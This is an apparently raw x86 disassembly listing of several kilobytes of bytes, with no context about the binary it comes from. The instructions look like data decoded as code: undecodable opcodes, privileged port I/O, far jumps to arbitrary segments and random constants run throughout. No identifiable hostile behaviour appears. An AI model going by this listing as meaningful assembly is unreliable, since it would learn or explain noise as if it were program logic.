  4126df:	div    BYTE PTR [ebx]
  4126e1:	cmc    
  4126e2:	dec    esp
  4126e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126e4:	pop    edi
  4126e5:	xor    BYTE PTR [ebx],al
  4126e7:	lods   eax,DWORD PTR ds:[esi]
  4126e8:	mov    dl,0x21
  4126ea:	xchg   ebp,eax
  4126eb:	add    ah,ch
  4126ed:	daa    
  4126ee:	and    ah,BYTE PTR ds:0x4a09baf4
  4126f4:	jmp    0x41270a
  4126f6:	iret   
  4126f7:	and    al,0x6a
  4126f9:	cmp    esp,DWORD PTR [esi+eax*8]
  4126fc:	loopne 0x412721
  4126fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ff:	inc    esi
  412700:	cdq    
  412701:	sub    dh,al
  412703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412704:	dec    BYTE PTR [esp+eax*2-0x61]
  412708:	pop    esp
  412709:	adc    al,0x0
  41270b:	mov    ebp,edi
  41270d:	sbb    esi,DWORD PTR [edi]
  41270f:	push   eax
  412710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412711:	add    DWORD PTR [ecx+ebp*4],esp
  412714:	cdq    
  412715:	addr16 pusha 
  412717:	mov    al,0xa3
  412719:	sub    al,0xb5
  41271b:	sub    eax,0xc2c79b7
  412720:	daa    
  412721:	test   DWORD PTR [edx],edx
  412723:	aam    0xe5
  412725:	push   ss
  412726:	sbb    BYTE PTR [edi],cl
  412728:	pop    ebx
  412729:	or     bh,BYTE PTR [edx+0x54d5f80c]
  41272f:	mov    edx,0x451cf913
  412734:	add    bl,BYTE PTR [ebx+edx*8+0x6e]
  412738:	xchg   ebp,eax
  412739:	sub    BYTE PTR [edx],al
  41273b:	sub    BYTE PTR [ebp-0x10],ah
  41273e:	or     eax,0xf97b453a
  412743:	pop    ecx
  412744:	popa   
  412745:	cmc    
  412746:	mov    WORD PTR [edi+0xb0a3094],ss
  41274c:	or     al,0xbe
  41274e:	cs test eax,0x6c50ed01
  412754:	jae    0x4127c5
  412756:	jne    0x41276e
  412758:	(bad)  
  41275a:	test   cl,ch
  41275c:	sbb    eax,0xc22f4c0a
  412761:	stos   DWORD PTR es:[edi],eax
  412762:	jp     0x4127d7
  412764:	je     0x41270f
  412766:	aam    0x10
  412768:	xor    edi,DWORD PTR [eax-0x18717d36]
  41276e:	aad    0x72
  412770:	fisttp DWORD PTR [ecx]
  412772:	shr    cl,cl
  412774:	xor    ebp,DWORD PTR [ebp+0x16]
  412777:	shl    BYTE PTR [ebx+0x12],0x5d
  41277b:	or     bh,ch
  41277d:	xchg   ebx,eax
  41277e:	std    
  41277f:	sub    al,0x13
  412781:	fild   WORD PTR [ecx]
  412783:	inc    ebp
  412784:	nop
  412785:	(bad)  
  412786:	cld    
  412787:	xor    DWORD PTR [esi-0x72a6d938],edi
  41278d:	mov    ch,0xac
  41278f:	jp     0x41278c
  412791:	mov    ebx,0x7fe51e87
  412796:	pop    eax
  412797:	fst    QWORD PTR [ebp+0x5f]
  41279a:	retf   
  41279b:	add    al,0x17
  41279d:	mov    esi,DWORD PTR [ecx-0x5a]
  4127a0:	repz pop edi
  4127a2:	pop    ebp
  4127a3:	jb     0x41274c
  4127a5:	test   eax,0xaad05a2a
  4127aa:	xchg   esp,eax
  4127ab:	sbb    DWORD PTR [ebx+0x38e14b59],edx
  4127b1:	aaa    
  4127b2:	cld    
  4127b3:	call   0xf405:0x99890f55
  4127ba:	add    DWORD PTR [edi-0x69],0x27
  4127be:	test   esp,esp
  4127c0:	add    bh,dh
  4127c2:	push   edx
  4127c3:	or     esp,DWORD PTR [ecx+0x3b]
  4127c6:	xchg   edi,eax
  4127c7:	cmp    BYTE PTR [ecx-0x52c65d25],bh
  4127cd:	xchg   esp,eax
  4127ce:	fld    TBYTE PTR [eax-0xe]
  4127d1:	push   cs
  4127d2:	js     0x4127e7
  4127d4:	jbe    0x4127a9
  4127d6:	jmp    0xef08:0xcf80a6c6
  4127dd:	cmp    al,0xd2
  4127df:	mov    ebp,DWORD PTR [esi-0x1c49516d]
  4127e5:	repnz sub al,0x3f
  4127e8:	rol    DWORD PTR [ebx],0xf5
  4127eb:	push   ds
  4127ec:	push   eax
  4127ed:	out    0x9d,eax
  4127ef:	mov    al,ds:0x35f82e84
  4127f4:	push   ss
  4127f5:	add    DWORD PTR [eax+0x516405eb],edx
  4127fb:	push   esp
  4127fc:	test   BYTE PTR [eax+0x2f23e133],ch
  412802:	ret    0x38bd
  412805:	add    al,BYTE PTR [eax]
  412807:	pusha  
  412808:	lods   eax,DWORD PTR ds:[esi]
  412809:	cmp    ebx,DWORD PTR [ecx-0x13]
  41280c:	(bad)  
  41280e:	dec    eax
  41280f:	outs   dx,BYTE PTR ds:[esi]
  412810:	dec    edi
  412811:	lods   al,BYTE PTR ds:[esi]
  412812:	sub    edx,DWORD PTR [edi+esi*8]
  412815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412816:	out    dx,eax
  412817:	jl     0x4127f7
  412819:	push   edi
  41281a:	fnstenv [ebx+ebp*8]
  41281d:	or     al,0x53
  41281f:	mov    eax,fs
  412821:	retf   0xd148
  412824:	mov    al,0x63
  412826:	std    
  412827:	out    dx,al
  412828:	sub    al,0x10
  41282a:	sbb    DWORD PTR [esi+0x6f],ecx
  41282d:	mov    ebp,0xc8ba3d35
  412832:	(bad)  
  412834:	xor    BYTE PTR [ebp+0x56],dh
  412837:	ds rcl dl,cl
  41283a:	jns    0x412873
  41283c:	or     eax,0x280c4156
  412841:	sbb    eax,edx
  412843:	repnz fisub WORD PTR [edi+0x7f7321f5]
  41284a:	(bad)  
  41284b:	imul   ebp,DWORD PTR [esi],0xa456bec8
  412851:	mov    esp,0x1d9432b5
  412856:	stos   DWORD PTR es:[edi],eax
  412857:	push   esi
  412859:	jecxz  0x412818
  41285b:	inc    esp
  41285c:	cmp    bh,BYTE PTR [ebp+ecx*8-0x60]
  412860:	sub    al,0x73
  412862:	adc    eax,0xc97d225d
  412867:	inc    ebx
  412868:	jmp    0xfa4f093
  41286d:	popf   
  41286e:	stos   DWORD PTR es:[edi],eax
  41286f:	arpl   WORD PTR [eax-0x14f99cb2],si
  412875:	jmp    0x6e8e:0xf98f6f98
  41287c:	nop
  41287d:	jmp    DWORD PTR [ebp+0xcabdda6]
  412883:	dec    ebx
  412884:	adc    al,0xa3
  412886:	or     esp,0xa
  412889:	sub    eax,0x89e18af8
  41288e:	and    al,0x34
  412890:	enter  0x812e,0xf9
  412894:	outs   dx,BYTE PTR ds:[esi]
  412895:	push   DWORD PTR [ebp*4-0x23ea4777]
  41289c:	repnz add al,0x67
  41289f:	std    
  4128a0:	sub    DWORD PTR [edi+edi*4+0x4dc21eb8],0xffffffac
  4128a8:	push   eax
  4128a9:	adc    bl,BYTE PTR [ecx-0x19]
  4128ac:	jbe    0x412877
  4128ae:	fidiv  DWORD PTR [ebp-0xa]
  4128b1:	pop    ebx
  4128b2:	adc    BYTE PTR [esi-0x1c],al
  4128b5:	adc    BYTE PTR [ecx+0x56],dl
  4128b8:	iret   
  4128b9:	cmp    ecx,DWORD PTR [esi-0x428cc279]
  4128bf:	cli    
  4128c0:	or     cl,dh
  4128c2:	push   ebp
  4128c3:	scas   eax,DWORD PTR es:[edi]
  4128c4:	mov    al,ss:0x56820f8c
  4128ca:	jp     0x4128c9
  4128cc:	sub    ebp,ebp
  4128ce:	cmp    DWORD PTR [ecx],esi
  4128d0:	add    bh,ah
  4128d2:	aas    
  4128d3:	xchg   ebx,eax
  4128d4:	pop    ds
  4128d5:	xchg   ebx,esi
  4128d7:	cdq    
  4128d8:	cdq    
  4128d9:	scas   eax,DWORD PTR es:[edi]
  4128da:	pop    ss
  4128db:	sub    dh,dh
  4128dd:	ret    0xe748
  4128e0:	cmp    eax,DWORD PTR [ebx]
  4128e2:	cld    
  4128e3:	shl    bl,0xc6
  4128e6:	lods   eax,DWORD PTR ds:[esi]
  4128e7:	retf   
  4128e8:	ret    0xd099
  4128eb:	retf   0xeee6
  4128ee:	xor    cl,al
  4128f0:	and    cl,BYTE PTR [eax+edi*1-0x225d250c]
  4128f7:	test   edx,esp
  4128f9:	dec    esi
  4128fa:	fwait
  4128fb:	jle    0x412964
  4128fd:	xchg   ebx,eax
  4128fe:	popa   
  4128ff:	(bad)  
  412900:	loopne 0x412886
  412902:	(bad)  
  412905:	pop    ss
  412906:	test   BYTE PTR [edx+0x3e],dl
  412909:	fstp   DWORD PTR [esi]
  41290b:	lds    edx,FWORD PTR [esi+0x7]
  41290e:	push   edx
  41290f:	push   esp
  412910:	(bad)  
  412911:	jne    0x412992
  412913:	pop    ebx
  412914:	jge    0x4128e4
  412916:	xor    eax,0x96a864c6
  41291b:	mov    ds:0xe51ce35a,eax
  412920:	xchg   ecx,eax
  412921:	and    DWORD PTR [ecx+0x1b276cfc],eax
  412927:	daa    
  412928:	dec    edx
  412929:	in     eax,dx
  41292a:	add    DWORD PTR [ecx+0x4582af18],edx
  412930:	or     BYTE PTR [edi-0x7d506fe5],bl
  412936:	sub    al,0x32
  412938:	(bad)  [ecx-0x1051400f]
  41293e:	dec    cx
  412940:	test   DWORD PTR [esi+0x49],edx
  412943:	call   0x1c1e435a
  412948:	push   ecx
  412949:	xor    ecx,ebx
  41294b:	in     eax,0x67
  41294d:	lahf   
  41294e:	mov    bh,0xfd
  412950:	in     al,0xf2
  412952:	inc    ebp
  412953:	test   BYTE PTR [eax],ch
  412955:	xor    al,0xb0
  412957:	sbb    eax,0x76fe86a3
  41295c:	enter  0x3292,0xc3
  412960:	jnp    0x4129d2
  412962:	fst    QWORD PTR [ebx-0x918a03c]
  412968:	and    al,BYTE PTR [edi]
  41296a:	jp     0x41299f
  41296c:	jno    0x4128f9
  41296e:	idiv   BYTE PTR [eax-0x1d]
  412971:	lock jmp 0xba73:0x4eb094a3
  412979:	or     BYTE PTR [ecx],dl
  41297b:	mov    dl,0x15
  41297d:	sbb    dl,ch
  41297f:	(bad)  
  412980:	cmp    DWORD PTR [ecx-0x2cb748f6],edx
  412986:	inc    esp
  412987:	mov    cl,0xf3
  412989:	jle    0x412925
  41298b:	inc    edx
  41298c:	(bad)  
  41298d:	hlt    
  41298e:	ds dec edx
  412990:	lds    ecx,FWORD PTR [eax]
  412992:	fcom   DWORD PTR [edx-0x6]
  412995:	pop    ss
  412996:	daa    
  412997:	es xor al,0x1d
  41299a:	and    ecx,ebp
  41299c:	int3   
  41299d:	xchg   ebp,eax
  41299e:	adc    BYTE PTR [esi-0x59],0x4
  4129a2:	jns    0x4129a2
  4129a4:	jo     0x412994
  4129a6:	(bad)  
  4129a7:	dec    ebx
  4129a8:	mov    DWORD PTR [ebx],esp
  4129aa:	xor    DWORD PTR [edi],edi
  4129ac:	push   ss
  4129ad:	cmp    ah,BYTE PTR [ecx+0x5decf993]
  4129b3:	lea    ebx,[eax-0x1e]
  4129b6:	pop    es
  4129b7:	mov    edi,0xa65aab7a
  4129bc:	jo     0x412a26
  4129be:	lods   eax,DWORD PTR ds:[esi]
  4129bf:	jno    0x412a01
  4129c1:	push   0xe3382f6c
  4129c6:	add    eax,0xe575af30
  4129cb:	xor    BYTE PTR [eax+0x40],al
  4129ce:	(bad)  
  4129d0:	mov    eax,ds:0xe34d075a
  4129d5:	sti    
  4129d6:	xor    edi,DWORD PTR [edx-0x30f38906]
  4129dc:	div    DWORD PTR [ecx]
  4129de:	int    0x7d
  4129e0:	cld    
  4129e1:	mov    esp,0x1762cad1
  4129e6:	sub    dl,BYTE PTR [edx+0x13de4f78]
  4129ec:	inc    edi
  4129ed:	sbb    BYTE PTR [ecx],dh
  4129ef:	or     BYTE PTR [esi*1+0x15f4a643],dl
  4129f6:	cmp    dh,BYTE PTR [edx]
  4129f8:	pop    es
  4129f9:	xor    edi,esp
  4129fb:	push   ebx
  4129fc:	out    0xff,eax
  4129fe:	jno    0x412a5f
  412a00:	cmp    eax,0x2d1f337c
  412a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a06:	adc    BYTE PTR [esi-0x23],bh
  412a09:	leave  
  412a0a:	leave  
  412a0b:	xor    ebp,DWORD PTR [edi+0x5e]
  412a0e:	jecxz  0x4129ba
  412a10:	jp     0x4129c9
  412a12:	inc    edi
  412a13:	cmp    dh,cl
  412a15:	idiv   ecx
  412a17:	test   al,0x3d
  412a19:	lea    eax,[edi-0x2]
  412a1c:	sub    al,0xed
  412a1e:	add    edx,edi
  412a20:	add    eax,0x72be5833
  412a25:	(bad)  
  412a26:	or     esi,DWORD PTR [ecx+0xa6038d1]
  412a2c:	arpl   WORD PTR [ebx-0x4f673cef],bp
  412a32:	(bad)  
  412a33:	rcl    BYTE PTR [ecx-0x29],1
  412a36:	push   ecx
  412a37:	into   
  412a38:	push   esp
  412a39:	cld    
  412a3a:	fild   DWORD PTR [ebx-0x6a018067]
  412a40:	xor    esp,esp
  412a42:	retf   
  412a43:	shr    DWORD PTR [edx-0x7980bc54],0x32
  412a4a:	jl     0x412a70
  412a4c:	repz test al,0x4f
  412a4f:	dec    esp
  412a50:	adc    esp,DWORD PTR [edx+0x49]
  412a53:	xchg   BYTE PTR [edx+edx*2-0x1f],cl
  412a57:	add    esp,DWORD PTR [ecx]
  412a59:	(bad)  
  412a5a:	xor    al,0x7f
  412a5c:	mov    ds:0x99499fc3,eax
  412a61:	mov    ebx,0x406e2026
  412a66:	or     eax,0x6cd655c6
  412a6b:	push   0x9
  412a6d:	icebp  
  412a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a6f:	das    
  412a70:	fisttp DWORD PTR [edi-0x63a9f25d]
  412a76:	mov    ebp,0xb681d474
  412a7b:	sti    
  412a7c:	iret   
  412a7d:	jne    0x412a50
  412a7f:	and    esp,DWORD PTR [eax]
  412a81:	shr    BYTE PTR [edx],0xfa
  412a84:	aaa    
  412a85:	test   ecx,ebp
  412a87:	inc    esp
  412a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a89:	adc    DWORD PTR ds:0x1bfa1c07,edi
  412a8f:	xchg   esp,eax
  412a90:	jae    0x412a35
  412a92:	sar    DWORD PTR ds:0x2f3352b0,1
  412a98:	mov    ebx,0xa65ec5dc
  412a9d:	and    eax,0xb8d7466b
  412aa2:	popa   
  412aa3:	mov    ch,0x7b
  412aa5:	pop    ebp
  412aa6:	sbb    al,0x44
  412aa8:	enter  0x34d3,0x4d
  412aac:	or     ecx,DWORD PTR [edi-0x4316c4eb]
  412ab2:	test   DWORD PTR [ebx-0x4cbe55d7],0x4678587a
  412abc:	cmc    
  412abd:	sbb    DWORD PTR [ebx+eiz*1+0x12],esi
  412ac1:	pop    ebp
  412ac2:	shr    BYTE PTR [edx-0x60237ca1],0x84
  412ac9:	out    dx,eax
  412aca:	push   0x4b
  412acc:	in     eax,0x89
  412ace:	cwde   
  412acf:	shl    BYTE PTR [esi+eiz*8-0x27],0xb4
  412ad4:	rep stos DWORD PTR es:[edi],eax
  412ad6:	and    DWORD PTR [ebp-0x2b],esi
  412ad9:	nop
  412ada:	adc    eax,0xb5cda0b6
  412adf:	gs xor ebx,esi
  412ae2:	inc    esp
  412ae3:	ret    
  412ae4:	fdiv   QWORD PTR [ecx+0xc]
  412ae7:	ins    BYTE PTR es:[edi],dx
  412ae8:	mov    edx,0xea010b78
  412aed:	cmp    ebp,DWORD PTR [esi+0x2a5afa58]
  412af3:	adc    ebx,esp
  412af5:	sub    ebp,DWORD PTR [ebx+0x3113600b]
  412afb:	mov    BYTE PTR [ecx-0x46],dh
  412afe:	fcmovb st,st(7)
  412b00:	imul   edx,esp,0x64
  412b03:	dec    esp
  412b04:	add    edi,esi
  412b06:	inc    ebx
  412b07:	out    dx,al
  412b08:	push   ds
  412b09:	cmp    ah,ch
  412b0b:	shl    DWORD PTR [ecx-0x35bddbd6],0x97
  412b12:	cmp    esi,ebp
  412b14:	push   0x6f12d4ad
  412b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1a:	mov    esi,0x88346f0d
  412b1f:	push   0xbbf31b45
  412b24:	idiv   DWORD PTR [ebx]
  412b26:	mov    dh,0xfc
  412b28:	xor    DWORD PTR [ebp+0x1e],ebp
  412b2b:	stos   DWORD PTR es:[edi],eax
  412b2c:	outs   dx,BYTE PTR ds:[esi]
  412b2d:	out    dx,al
  412b2e:	arpl   WORD PTR [ecx+edi*4],ax
  412b31:	push   ebp
  412b32:	sti    
  412b33:	mov    bh,0xd2
  412b35:	lods   al,BYTE PTR ds:[esi]
  412b36:	mov    esi,0x2985ae0d
  412b3b:	rcr    DWORD PTR [ebx+0x6],1
  412b3e:	push   ebx
  412b3f:	push   ebp
  412b40:	sbb    edx,DWORD PTR [ebp+0x6f]
  412b43:	call   0x3469:0x321d48dd
  412b4a:	repnz (bad) 
  412b4c:	push   ebp
  412b4d:	xor    ebx,DWORD PTR [eax-0x46]
  412b50:	jecxz  0x412b5d
  412b52:	xor    ch,cl
  412b54:	jns    0x412b9c
  412b56:	and    BYTE PTR [eax+0x26cd8c9a],0x1a
  412b5d:	fldenv [ecx-0xd]
  412b60:	cmc    
  412b61:	pusha  
  412b62:	xor    bl,BYTE PTR [esi+0x166957a1]
  412b68:	pop    ss
  412b69:	adc    ebx,DWORD PTR [eax-0x497c1821]
  412b6f:	dec    esp
  412b70:	and    DWORD PTR [edi-0x67],eax
  412b73:	sti    
  412b74:	mov    edx,0xf0c4217c
  412b79:	xchg   esi,eax
  412b7a:	mov    eax,0xb9dce057
  412b7f:	int3   
  412b80:	fs daa 
  412b82:	or     dh,0x1f
  412b85:	mov    ah,0x51
  412b87:	adc    ebx,0xae35f727
  412b8d:	jl     0x412b66
  412b8f:	push   ebp
  412b90:	mov    ah,0xb1
  412b92:	xchg   edx,eax
  412b93:	loope  0x412be5
  412b95:	ret    0x4f1d
  412b98:	retf   0x4d1
  412b9b:	stc    
  412b9c:	xor    eax,0xba994040
  412ba1:	sub    dh,bl
  412ba3:	jbe    0x412ba4
  412ba5:	jo     0x412b7e
  412ba7:	cli    
  412ba8:	push   edi
  412ba9:	js     0x412bca
  412bab:	ret    
  412bac:	pop    ecx
  412bad:	sbb    al,0xc
  412baf:	dec    ebp
  412bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bb1:	(bad)  [ebx+0x28]
  412bb4:	iret   
  412bb5:	jno    0x412bad
  412bb7:	add    ch,0x54
  412bba:	aad    0x8a
  412bbc:	popa   
  412bbd:	shl    al,1
  412bbf:	xor    eax,0x29f0556e
  412bc4:	mov    ch,0x66
  412bc6:	mov    ecx,0xd125ed09
  412bcb:	retf   0x1e0
  412bce:	adc    DWORD PTR [edx-0xe],ebp
  412bd1:	mov    bh,0x69
  412bd3:	pop    esi
  412bd4:	jns    0x412c4a
  412bd6:	shl    DWORD PTR [esi],0xe7
  412bd9:	out    0x2f,al
  412bdb:	arpl   WORD PTR [ebp-0x6365151a],sp
  412be1:	cli    
  412be2:	cwde   
  412be3:	xor    edx,DWORD PTR [ebp+0x11]
  412be6:	push   ebx
  412be7:	xchg   ebx,eax
  412be8:	jecxz  0x412c5f
  412bea:	jne    0x412bf6
  412bec:	dec    esi
  412bed:	out    dx,eax
  412bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bef:	xor    esp,DWORD PTR ss:[esi-0x36]
  412bf3:	xchg   ah,dh
  412bf5:	mov    ecx,0x92d451e6
  412bfa:	scas   al,BYTE PTR es:[edi]
  412bfb:	(bad)  
  412bfc:	repz jno 0x412c51
  412bff:	add    DWORD PTR [ecx+0x51],edx
  412c02:	jmp    DWORD PTR [ebx]
  412c04:	or     edx,DWORD PTR [ebx-0x49]
  412c07:	outs   dx,BYTE PTR ds:[esi]
  412c08:	dec    esp
  412c09:	ret    0x90af
  412c0c:	mov    esp,edx
  412c0e:	push   edi
  412c0f:	repnz mov edi,0xf38b0f47
  412c15:	popf   
  412c16:	xor    eax,0x3e7819d5
  412c1b:	cmp    DWORD PTR [ecx-0x40],edx
  412c1e:	push   ecx
  412c1f:	aas    
  412c20:	mov    edx,0x10cdd53d
  412c25:	iret   
  412c26:	cs ret 0xf25
  412c2a:	sub    esi,DWORD PTR [eax]
  412c2c:	mov    edi,0x3163ce7e
  412c31:	cmp    dh,BYTE PTR [ebp+0x4625683a]
  412c37:	(bad)  
  412c38:	jmp    0xff22:0x98b65bae
  412c3f:	dec    edx
  412c40:	sbb    BYTE PTR [ecx],cl
  412c42:	jp     0x412c6a
  412c44:	outs   dx,BYTE PTR ds:[esi]
  412c45:	push   ds
  412c46:	and    BYTE PTR [esi+0x27e3ab53],0x2f
  412c4d:	xchg   ebx,eax
  412c4e:	inc    ebp
  412c4f:	push   esi
  412c50:	adc    al,0xfe
  412c52:	dec    edx
  412c53:	xor    eax,0x84b02442
  412c58:	call   0xaea49f2d
  412c5d:	pop    ecx
  412c5e:	cmp    cl,BYTE PTR [esi]
  412c60:	hlt    
  412c61:	push   edx
  412c62:	jno    0x412c3d
  412c64:	(bad)  
  412c65:	in     al,0x77
  412c67:	das    
  412c68:	mov    esi,0x56ae6fd3
  412c6d:	sub    DWORD PTR es:[esi],edi
  412c70:	sbb    bh,BYTE PTR [esi+eax*4+0xc]
  412c74:	das    
  412c75:	mov    edi,0xaae15da4
  412c7a:	sbb    ah,BYTE PTR [ebp+0x29]
  412c7d:	jp     0x412ced
  412c7f:	and    DWORD PTR [edi],ecx
  412c81:	dec    edi
  412c82:	pop    ecx
  412c83:	mov    bl,0xda
  412c85:	pop    esi
  412c86:	cmp    esp,DWORD PTR [ebp+0x0]
  412c89:	data16 mov cl,0xa1
  412c8c:	mov    dh,0x86
  412c8e:	fstp   QWORD PTR ds:0x8e273d78
  412c94:	push   edi
  412c95:	stos   BYTE PTR es:[edi],al
  412c96:	adc    BYTE PTR [edx+0x4b],ch
  412c99:	pop    esp
  412c9a:	jecxz  0x412c9e
  412c9c:	dec    ecx
  412c9d:	std    
  412c9e:	pop    esp
  412c9f:	jle    0xcb7b41a3
  412ca5:	test   bl,0x5e
  412ca8:	mov    eax,0x86e18138
  412cad:	ud0    esp,DWORD PTR [ebp+0x185a8c77]
  412cb4:	ss inc edi
  412cb6:	jns    0x412cb9
  412cb8:	sbb    BYTE PTR [edi+0x20],0x55
  412cbc:	adc    eax,0xf0d93b1f
  412cc1:	mov    edi,0xe93ab233
  412cc6:	jp     0x412c62
  412cc8:	retf   0xb9ba
  412ccb:	ins    DWORD PTR es:[edi],dx
  412ccc:	sahf   
  412ccd:	sar    DWORD PTR [ebx],0x96
  412cd0:	(bad)  
  412cd1:	mov    eax,ds:0xd69fce2c
  412cd6:	jg     0x412ce9
  412cd8:	xchg   esp,eax
  412cd9:	ins    BYTE PTR es:[edi],dx
  412cda:	das    
  412cdb:	xchg   esi,eax
  412cdc:	sub    edx,DWORD PTR [ecx+0xf23fcb7]
  412ce2:	sub    ch,BYTE PTR [ebp+edx*8-0x6f]
  412ce6:	sbb    BYTE PTR [edi],dl
  412ce8:	jae    0x412cf8
  412cea:	fcomp  DWORD PTR [ebx+0x58ab29bd]
  412cf0:	inc    ebx
  412cf1:	aaa    
  412cf2:	aam    0xbc
  412cf4:	cmp    DWORD PTR [edi+0x386d707f],0x907a7b1a
  412cfe:	ja     0x412ce5
  412d00:	pop    esp
  412d01:	out    0xe4,eax
  412d03:	(bad)  
  412d06:	sbb    BYTE PTR [esi],al
  412d08:	lods   al,BYTE PTR ds:[esi]
  412d09:	stos   DWORD PTR es:[edi],eax
  412d0a:	and    al,0x55
  412d0c:	dec    eax
  412d0d:	mov    cl,0x7e
  412d0f:	loope  0x412c92
  412d11:	sbb    bh,BYTE PTR [ebp-0x5e]
  412d14:	inc    DWORD PTR [edi+eax*1-0x3c]
  412d18:	inc    esp
  412d19:	loopne 0x412d8f
  412d1b:	inc    ecx
  412d1c:	aad    0xc9
  412d1e:	scas   al,BYTE PTR es:[edi]
  412d1f:	lods   eax,DWORD PTR ds:[esi]
  412d20:	xchg   esp,eax
  412d21:	pop    esi
  412d22:	cmp    BYTE PTR [ebp+0x54],al
  412d25:	dec    edi
  412d26:	fmul   QWORD PTR [eax-0x1c]
  412d29:	ja     0x412d00
  412d2b:	or     BYTE PTR [ebx+0x69353fcf],bl
  412d31:	popf   
  412d32:	ret    
  412d33:	inc    ebp
  412d34:	ins    BYTE PTR es:[edi],dx
  412d35:	or     ebx,edx
  412d37:	pop    ebp
  412d38:	ror    BYTE PTR [eax],1
  412d3a:	out    dx,eax
  412d3b:	das    
  412d3c:	int3   
  412d3d:	outs   dx,BYTE PTR ds:[esi]
  412d3e:	aam    0xf1
  412d40:	fisttp DWORD PTR [eax+0x3e]
  412d43:	rol    DWORD PTR [edi],1
  412d45:	pop    edi
  412d46:	xor    cl,cl
  412d48:	gs test al,0xdd
  412d4b:	dec    eax
  412d4d:	ror    BYTE PTR [ebp-0x34],1
  412d50:	retf   
  412d51:	jmp    0x1ce0:0x7e764cd9
  412d58:	pop    ebp
  412d59:	pop    ebp
  412d5a:	push   ebx
  412d5b:	add    DWORD PTR [ecx-0x45],ebp
  412d5e:	scas   al,BYTE PTR es:[edi]
  412d5f:	dec    edi
  412d60:	jnp    0x412d43
  412d62:	lods   al,BYTE PTR ds:[esi]
  412d63:	popf   
  412d64:	bound  ebp,QWORD PTR [edx+0x5]
  412d67:	pop    ebx
  412d68:	mov    esi,0x2b76927c
  412d6d:	loope  0x412d8e
  412d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d70:	add    ch,dh
  412d72:	xor    ecx,DWORD PTR gs:[edi]
  412d75:	xchg   BYTE PTR [ebp-0x2e],dh
  412d78:	dec    edi
  412d79:	add    BYTE PTR [ecx+0x13fb662e],ah
  412d7f:	jo     0x412ded
  412d81:	mov    edx,0x1da806e7
  412d86:	cs mov esp,esi
  412d89:	shl    BYTE PTR [ecx],cl
  412d8b:	xor    DWORD PTR [ecx+0x52c2d59],esp
  412d91:	dec    edx
  412d92:	int3   
  412d93:	adc    BYTE PTR [eax-0x145e3767],bl
  412d99:	mov    bh,0x6e
  412d9b:	(bad)  
  412d9c:	jle    0x412d43
  412d9e:	ficomp WORD PTR [edi]
  412da0:	loopne 0x412d34
  412da2:	ins    BYTE PTR es:[edi],dx
  412da3:	loop   0x412d9b
  412da5:	push   ds
  412da6:	aaa    
  412da7:	es mov bh,0x6d
  412daa:	enter  0xe4f1,0x81
  412dae:	fimul  WORD PTR [edx-0x7820e24f]
  412db4:	xor    DWORD PTR [ebx],ecx
  412db6:	cmp    eax,0x8ac6f264
  412dbb:	mov    BYTE PTR [ebx+0x10f47ef9],cl
  412dc1:	std    
  412dc2:	cwde   
  412dc3:	mov    ah,BYTE PTR [ecx-0x573f8606]
  412dc9:	mov    esp,0xb0c66610
  412dce:	inc    edi
  412dcf:	call   0xdd12:0x45877b6a
  412dd6:	cli    
  412dd7:	mul    DWORD PTR [esi]
  412dd9:	neg    BYTE PTR [eax-0x7eb92862]
  412ddf:	xchg   edi,eax
  412de0:	es and bl,al
  412de3:	sub    eax,0xe5df2d32
  412de8:	sbb    eax,0x97070ff0
  412ded:	and    al,ch
  412def:	std    
  412df0:	ins    DWORD PTR es:[edi],dx
  412df1:	mov    edx,0x170c4567
  412df6:	aad    0x6a
  412df8:	sub    ebp,DWORD PTR [edi+edi*2-0x70460ecf]
  412dff:	or     ebp,DWORD PTR [ecx]
  412e01:	les    edx,FWORD PTR [edx+0x5bc184dc]
  412e07:	imul   esi,DWORD PTR [ebp+0x63],0x12
  412e0b:	adc    bl,cl
  412e0d:	push   edi
  412e0e:	cs in  eax,0x30
  412e11:	sub    ecx,DWORD PTR [esi+esi*2]
  412e14:	je     0x412e2e
  412e16:	enter  0xc3dc,0xe1
  412e1a:	sbb    ah,BYTE PTR [eax]
  412e1c:	pop    es
  412e1d:	inc    ebx
  412e1e:	xchg   esi,eax
  412e1f:	rol    BYTE PTR [edx-0xb],cl
  412e22:	mov    edx,0xa23a513b
  412e27:	fdiv   DWORD PTR [ebx-0x4bdaeb3f]
  412e2d:	add    ebp,DWORD PTR [ebp-0x7d]
  412e30:	add    DWORD PTR [edi+ebp*4+0x6f],esp
  412e34:	push   esp
  412e35:	sti    
  412e36:	sbb    al,0x17
  412e38:	mov    edx,ds
  412e3a:	push   ds
  412e3b:	pop    ss
  412e3c:	pop    esp
  412e3d:	xlat   BYTE PTR ds:[ebx]
  412e3e:	clc    
  412e3f:	push   es
  412e40:	add    eax,0x771daf01
  412e45:	rcl    al,cl
  412e47:	lea    esi,[ebx+edx*2]
  412e4a:	xor    ah,bl
  412e4c:	inc    edi
  412e4d:	sub    eax,0xe79b496
  412e52:	ror    BYTE PTR [eax],1
  412e54:	ss dec edi
  412e56:	gs mov ah,0x78
  412e59:	sub    eax,esi
  412e5b:	mov    cl,0x78
  412e5d:	push   ebx
  412e5e:	and    al,0x41
  412e60:	xchg   ebx,eax
  412e61:	jae    0x412e6c
  412e63:	jae    0x412ded
  412e65:	pusha  
  412e66:	ret    0xaca9
  412e69:	push   edx
  412e6a:	mov    ch,0x7f
  412e6c:	push   edx
  412e6d:	or     eax,DWORD PTR [ecx-0x17]
  412e70:	add    BYTE PTR [esi+edi*4+0x49],dl
  412e74:	jp     0x412e14
  412e76:	sub    DWORD PTR ds:0x9ff1a039,edi
  412e7c:	push   ds
  412e7d:	adc    esi,DWORD PTR [eax+0x25]
  412e80:	in     al,dx
  412e81:	imul   edx,DWORD PTR [edi+0x57c25178],0xffffffee
  412e88:	xchg   esp,eax
  412e89:	or     dh,BYTE PTR [edi]
  412e8b:	iret   
